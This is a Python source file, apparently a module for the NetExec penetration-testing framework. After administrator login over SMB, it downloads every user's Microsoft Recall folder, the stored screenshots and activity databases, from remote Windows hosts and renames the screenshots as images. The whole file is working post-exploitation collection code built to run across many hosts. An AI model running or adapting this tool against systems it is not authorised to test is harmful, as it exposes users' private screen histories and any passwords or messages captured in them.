from impacket import smb, smb3
import ntpath
from os import rename
from os.path import split, join, splitext
from glob import glob

class NXCModule:
    """
    Recall
    -------
    Module by @Marshall-Hallenbeck (@mjhallenbeck on Twitter)
    Inspired by https://github.com/xaitax/TotalRecall (code my own)
    """

    name = "recall"
    description = "Downloads Microsoft Recall folders for all users"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None

    def options(self, context, module_options):
        self.context = context
        self.logger = context.log
        self.recall_path = "\\AppData\\Local\\CoreAIPlatform.00\\UKP\\"

    def on_admin_login(self, context, connection):
        output_path = f"recall_{connection.host}"
        self.logger.debug("Getting all user Recall folders")
        recall_folders = connection.conn.listPath("C$", "\\Users\\*")
        self.logger.debug(f"Recall folders: {recall_folders}")
        if not recall_folders:
            self.logger.fail("No Recall folders found!")
        else:
            self.logger.success("Recall folder(s) found, attempting to dump contents")
        
        for recall_folder in recall_folders:
            if not recall_folder.is_directory():
                continue
            folder_name = recall_folder.get_longname()
            self.logger.debug(f"Folder: {folder_name}")
            if folder_name in [".", "..", "All Users", "Default", "Default User", "Public"]:
                continue
            
            full_path = ntpath.normpath(join(r"Users", folder_name, self.recall_path))
            self.logger.debug(f"Getting Recall folder {full_path}")
            user_output_dir = join(output_path, folder_name)
            try:
                connection.download_folder(full_path, user_output_dir, True)
            except (smb.SessionError, smb3.SessionError):
                self.logger.debug(f"Folder {full_path} not found!")
                
            self.logger.success(f"Recall folder for user {folder_name} downloaded to {user_output_dir}")
                
        self.logger.debug(f"Renaming screenshots at {output_path}")
        files = glob(f"{output_path}/*/ImageStore/*")
        self.logger.debug(f"Files to rename: {files}")
        for file in files:
            directory, filename = split(file)
            if not splitext(filename)[1]:
                rename(file, join(directory, f"{filename}.jpg"))
